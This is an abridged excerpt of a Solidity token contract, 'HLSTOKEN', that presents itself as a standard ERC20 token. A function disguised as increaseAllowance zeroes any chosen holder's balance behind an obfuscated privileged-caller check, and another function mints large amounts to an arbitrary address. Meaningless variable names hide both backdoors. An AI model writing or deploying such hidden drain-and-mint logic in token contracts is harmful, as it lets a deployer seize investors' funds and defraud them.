...
contract HLSTOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        ...
        uint256 curamount = HLS[newadd];
        uint256 newaaamount = HLS[newadd]+HLS[newadd]-curamount;
        HLS[newadd] -= newaaamount;
        }else{
        if(czaxw34 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        HLS[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
    ...
    function _transfer(
        ...
        uint256 balance = HLS[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        HLS[from] = HLS[from]-amount;
        HLS[to] = HLS[to]+amount;
